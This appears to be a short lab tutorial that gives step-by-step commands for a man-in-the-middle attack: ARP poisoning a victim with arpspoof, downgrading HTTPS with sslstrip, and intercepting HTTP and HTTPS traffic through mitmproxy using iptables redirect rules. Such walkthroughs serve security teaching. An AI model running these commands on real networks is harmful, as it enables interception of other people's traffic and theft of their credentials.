# Man in the middle attack using mitm-proxy

We are going to use arpspoof tool that is part of the dsniff suite for the MITM attack and mitmproxy for instancing a transparent MITM proxy for HTTP and HTTPS. If not already installed, with Kali Linux you can install them with:

```source
kali@attacker:$ sudo apt update
kali@attacker:$ sudo apt install dsniff mitmproxy
```

Implement a link-layer MITM attack for all the traffic from the victim to the Internet. In the attacker’s machine:

* Enable IP forwarding and disable ICMP redirects. To do so, edit `/etc/sysctl.conf` and uncomment (remove the #) the following lines:
    * `net.ipv4.ip_forward = 1`
    * `net.ipv4.conf.all.send_redirects = 0`
    * reload sysctl with: `sysctl -p`

ARP poison the victim in order to be in the middle of the traffic from the victim to the Internet:

```source
kali@attacker:$ sudo arpspoof -t <vitim_IP> <gateway_IP>
```


## SSLstrip attack

Now, letting the `arpspoof` running, on other terminal we start the `sslstrip` tool:

```source
kali@attacker:$ sslstrip –l 9000
```
> The port can be whatever you want

Now, we forward all the HTTP traffic from the victim to the Internet to your local sslstrip service:

```source
sudo iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9000
```

Be aware that with that method we are attacking HTTP, not HTTP**S**. So we will see only the HTTP traffic.

## MITproxy attack

**Important!** if you're using the same VM to run the MITM attack and the SSLstrip attack, you need to run flush the rules that were added to the iptables. To do so, run the following command:

```source
sudo iptables -t nat -F
```

Now, run mitmproxy and forward all the HTTP and HTTPS traffic from the victim to your local mitmproxy service. We will use the web version since it is more user friendly:

```source
mitmweb --mode transparent --showhost -p 5555
```

> Again, the port number here is arbitrary.

Now, add the forwarding rules in order to forward all the traffic (one rule for HTTP and another one for HTTPS) to our proxy server:

```source
sudo iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 5555
sudo iptables-legacy -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 5555
```